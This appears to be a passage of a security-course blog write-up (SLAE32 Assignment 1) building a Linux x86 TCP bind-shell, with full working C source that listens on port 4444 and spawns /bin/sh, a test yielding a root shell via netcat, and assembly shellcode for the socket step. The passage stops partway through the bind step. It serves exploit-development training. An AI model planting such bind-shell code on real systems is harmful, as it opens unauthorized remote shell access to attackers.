title = "SLAE32 Assignment 1 - TCP Bind-Shell Shellcode - Boku"
description = "Overview For the first Assigment of the SLAE32 course we were tasked with creating shellcode for a TCP bind-shell."
full_description = 'SLAE32 Assignment 1 - TCP Bind-Shell Shellcode 46 minute read Overview For the first Assigment of the SLAE32 course we were tasked with creating shellcode for a TCP bind-shell. What is shellcode? Shellcode is machine code that is digestable by the processor it is executing on. No extra compiling or linking is required for the code to execute. It has a target objective. It is typically small in size. This makes shellcode perfect for malware and exploits. Assembly Processors only understand Machine Code. The closest thing to writing in Binary is writing in Assembly code. Compiled Assembly code has a 1:1 correlation with Machine code. pretty much… - The compiler will typically add some extra stuff. You can strip the extra stuff and just get your shellcode. Sometimes the compiler has built in functions or different ways of doing things. Ultimately, if you know the hex of the assembly instructions you want, you can write a program using all hex and execute it on the processor. For Example: beta@zed$ msf-nasm_shell # Put the hex value 0x2 into the al register nasm > mov al, 0x2 00000000 B002 mov al,0x2 - Here we see the Machine Code equivalent for `mov al, 0x2` is 0xB0, 0x02 - This Assembly instruction is always this machiner- code for an intel-32 bit processor. # Put the hex value 0x1 into the bl register nasm > mov bl, 0x1 00000000 B301 mov bl,0x1 # Add the bl register to the al register, and save the result in register al nasm > add al, bl 00000000 00D8 add al,bl Assembly Language is dependant on the processor it is executing on, and the operating system. For this course all Assembly will be written for Intel 32-bit Architecture, and the Linux Operating System. Mapping C Code to Assembly To map out how I to write Assembly Code for a tcp bind-shell, first we will walk through creating a tcp bind-shell in C. C is the closest programming language to Assembly. Once we figure out the required C functions, we then need to figure out how we can replace them with Linux System-Calls. Required C Funtions & Execution Flow Create a new Socket. int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0); Create a TCP-IP Address for the Socket. struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) }; Bind the TCP-IP Address to the Socket. bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); Listen for incoming connections on the TCP-IP Socket. listen(ipv4Socket, 0); Accept the incoming connections, on the TCP-IP Socket, and create a new connected session. int clientSocket = accept(ipv4Socket, NULL, NULL); Transfer Standard-Input, Standard-Output, and Standard-Error to the connected session. dup2(clientSocket, 0); // STDIN dup2(clientSocket, 1); // STDOUT dup2(clientSocket, 2); // STDERR Spawn a /bin/sh shell for the client, in the connected session. execve("/bin/sh", NULL, NULL); Creating a TCP Bind Shell in C This is our C program to create a TCP Bind Shell. // Filename: basicBindShell.c // Author: boku #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netinet/ip.h> /* superset of previous */ #include <stdlib.h> int main(void) { int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) }; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); listen(ipv4Socket, 0); int clientSocket = accept(ipv4Socket, NULL, NULL); dup2(clientSocket, 0); dup2(clientSocket, 1); dup2(clientSocket, 2); execve("/bin/sh", NULL, NULL); } Great, before we dive into how this was created, lets test it to make sure it works. Compiling C Bind Shell root# gcc basicBindShell.c -o basicBindShell Testing Our Shellcode in the Host Program Terminal Window 1 root# ./basicBindShell Terminal Window 2 root# netstat -tanlp | grep basicBind tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN 31804/basicBindShell root# nc.traditional 127.0.0.1 4444 id uid=0(root) gid=0(root) groups=0(root) Awesome! It works. Lets dive into these C functions and how they work. 1. Create a new Socket Our first function is socket(). We already know that this function is used to create a new socket. To find out more about this function we will use the command man 7 socket from our linux terminal. man 7 socket int socket(int domain, int type, int protocol); Our requirements, for our bind shell, are that at Layer 3 we use the IP version 4 Protocol, and at Layer 4 we use the Transmission Control Protocol (TCP). After reviewing the socket() man pages, we discover we will need to fufill the following arguements. int domain = AF_INET IPv4 Internet protocols. int type = SOCK_STREAM Provides sequenced, reliable, two-way, connection-based byte streams (TCP). int protocol = 0 The protocol to be used with the socket. Normally there is only one protocol per socket type. In this case the protocol value is 0. Our C function int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0); 2. Create a TCP-IP Address for the Socket Now that our IPv4, TCP socket has been created, we will need to create an address for it. After creating the TCP-IP address, we will bind the address to the socket. To create the TCP-IP address (TCP Port Number & IP Address), we will dig into the ip man pages with command man 7 ip. We find this relevant information: // An IP socket address is defined as a combination of an IP // interface address and a 16-bit port number. struct sockaddr_in { sa_family_t sin_family; // address family: AF_INET in_port_t sin_port; // port in network byte order. See "man htons". struct in_addr sin_addr; /* internet address */ }; This is the struct we will need to fufill the third arguement in the above struct. struct in_addr { uint32_t s_addr; /* address in network byte order */ }; From the above information, we know that we will need to use the Address Family AF_INET, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using INADDR_ANY. Our C struct struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) }; man htons - The htons() function converts an unsigned short integer hostshort from host byte order to network byte order. man htonl - The htonl() function converts the unsigned integer hostlong from host byte order to network byte order. 3. Bind the TCP-IP Address to the Socket Now that we have a socket, a TCP port, and an IPv4 interface, we need to bind them all together. we will use the bind() C function to accomplish this, and dive into the man pages to discover the arguements we will need with the command man 2 bind. int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); sockfd The socket file descriptor is the variable ipv4Socket we created earlier when creating the socket. struct sockaddr *addr A pointer to the TCP-IP Socket Address we created earlier with the variable ipSocketAddr. socklen_t addrlen The final arguement is simply the byte length of our ipSocketAddr struct. We will fufill this using the C sizeof() function to do the work for us. Our C function bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); 4. Listen for incoming connections on the TCP-IP Socket Now that we have bound an address to our socket, we will need to configure it to be in the listening state. Allowing the socket to listen for incoming connections. To learn what we need to do we consult the manual page with man 2 listen. We find that the listen() function requires two arguments. int listen(int sockfd, int backlog); sockfd Simply our ipv4Socket variable. backlog This is for handling multiple connections. We only need to handle one connection at a time, therefor we will set this value to 0. Our C function listen(ipv4Socket, 0); 5. Accept the incoming connections and create a new connected session Now that our socket is listening we need to accept the incoming connections with the C function accept(). Consulting the manual page with man 2 accept we find that: // the accept function takes the connection request from the listen // function and creates a new connected socket. int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); We will give our accept() function the variable name clientSocket. We will use our ipv4Socket variable we created earlier to fulfill the int sockfd arguments, and set the remaining two arguments to NULL. Our C function int clientSocket = accept(ipv4Socket, NULL, NULL); 6. Transfer STDIN, STDOUT, STDER to the connected session Now that we have a tcp socket listening and accepting incoming connections, we will need to pass the input, output, and error messages from the program, to the connecting client. This will allow the connecting client to input text using their keyboard, and read the output that is returned. We will duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected socket using the dup2() function three times. We will consult the man pages for more information will man 2 dup2. int dup2(int oldfd, int newfd); We find that the dup2() function requires 2 arguements. The first arguement int oldfd we be fufilled using the clientSocket variable we created earlier. The second arguement int newfd will be fufilled using the number value for STDIN(0), STDOUT(1), and STDERR(2) respectively. Our three dup2 functions dup2(clientSocket, 0); dup2(clientSocket, 1); dup2(clientSocket, 2); 7. Spawn a “/bin/sh” shell in the connected session At this point we have our program listening, and accepting connections from incoming clients. Once the client connects, the input and output of our program is passed over to the connecting client. The last thing we need to do is execute a program for our client to interact with. We will use the C function execve() to execute the shell /bin/bash. Consulting the manual pages with man 2 execve we find: int execve(const char *filename, char *const argv[], char *const envp[]); We discover that since we are not passing any additional options/flags/enviorment-settings to our /bin/sh program, we may set the arguments argv[] and envp[] to NULL. The first arguement *filename requires we give it the full path to our program /bin/sh. Our C function execve("/bin/sh", NULL, NULL); Mapping System Calls to C Functions To find all the Linux System Calls we will read the header file unistd_32.h. Finding the System Call Number for Socket: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "socket" #define __NR_socketcall 102 At the Assembly level, the System-Call - socketcall 102, is used for 5 of the C functions we need: socket(), bind(), connect(), listen(), accept() To differentiate between which function to call, a corresponding value is held in the EBX Register. These Values can be found with: cat /usr/include/linux/net.h #define SYS_SOCKET 1 /* sys_socket(2) */ #define SYS_BIND 2 /* sys_bind(2) */ #define SYS_CONNECT 3 /* sys_connect(2) */ #define SYS_LISTEN 4 /* sys_listen(2) */ #define SYS_ACCEPT 5 /* sys_accept(2) */ Like all System Calls Linux, they are triggered when the Assembly instruction int 0x80 is executed. At the time of the interrupt, the value stored in the EAX register determines which system call is executed. From above, we see that five of our C funtions use the same system call - socketcall 102. For these functions, EAX will hold the value 102 (0x66 in Hex). The system call socketcall will know what to do (create a socket, listen, accept incoming connection, etc), based on the value stored in the EBX register. The arguments of the C level function will be pushed onto the stack, and the ECX register will point to the top of the stack. Stack Memory grows from high memory to low memory. We will need to store arguements in reverse order on the stack. Once we have pushed our array of consecutive arguments onto the stack, all we need to do is point the ECX register to the top of the stack. Creating the Assembly Shellcode 1. Create a new Socket C Function int socket(int domain, int type, int protocol); Our C Function <socketcall> int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 ); EAX=0x66 EBX ECX[0] ECX[1] ECX[2] EAX = 102 = 0x66 This is the value to call the SYSCAL socketcall. EBX = 1 = 0x1 Value for socket() function relative to the SYSCAL socketcall. #define SYS_SOCKET 1 // sys_socket(2) ECX[0] = AF_INET = 2 = 0x2 Find value of AF_INET: cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_INET #define AF_INET PF_INET // We see that AF_INET is mapped to PF_INET Find value of PF_INET: cat /usr/include/i386-linux-gnu/bits/socket.h | grep PF_INET #define PF_INET 2 // IP protocol family. ECX[1] = SOCK_STREAM = 1 = 0x1 Find value of SOCK_STREAM: cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h | grep SOCK_STREAM SOCK_STREAM = 1 ECX[2] = 0 = 0x0 For a TCP socket, the only option for the int protocol is 0. xor eax, eax ; This sets the EAX Register to NULL (all zeros). mov al, 0x66 ; EAX is now 0x00000066 = SYSCALL 102 - socketcall xor ebx, ebx ; This sets the EBX Register to NULL (all zeros). mov bl, 0x1 ; EBX is set to create a socket xor ecx, ecx ; This sets the ECX Register to NULL (all zeros). push ecx ; ECX[2]. ECX is NULL, the value needed for the first ; argument we need to push onto the stack push ebx ; ECX[1]. EBX already has the value we need for ECX[1] ; we will simply use it to push the value 1. push dword 0x2 ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET. mov ecx, esp ; ECX now holds the pointer to the beginning of the ; argument array stored on the stack. int 0x80 ; System Call Interrupt 0x80 - Executes socket(). ; Creates the Socket. xchg esi, eax ; After the SYSCAL, sockfd is stored in the EAX Register. ; Move it to the ESI Register; we will need it later. 2+3. Create a TCP-IP Address and Bind it to the Socket C Function int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); Our C Function <socketcall> bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); EAX=0x66 EBX ECX[0] ECX[1] ECX[2] EAX = 102 = 0x66 This is the value to call the SYSCAL socketcall. EBX = 2 = 0x2 Value for socket() function relative to the SYSCAL socketcall. #define SYS_BIND 2 // sys_bind(2) ECX[0] = int sockfd = ESI The Socket we created earlier and stored in the ESI register ECX[1] = const struct sockaddr *addr This will point to the Struct (array of variables) we will store onto the Stack. ECX[2] = sizeof(ipSocketAddr) The Binary Length of the Struct we will store in ECX[1]. This System Call is tricky because we will need to have an array within an array. ECX[1] will point to the start of the array of 3 variables on the Stack. We will push these 3 variables onto the stack first, then we will push ECX[2], ECX[1], and finally ECX[0]. This is the struct we used in C to store the IP-Socket Address values used for the bind() function call: struct sockaddr_in ipSocketAddr = { '
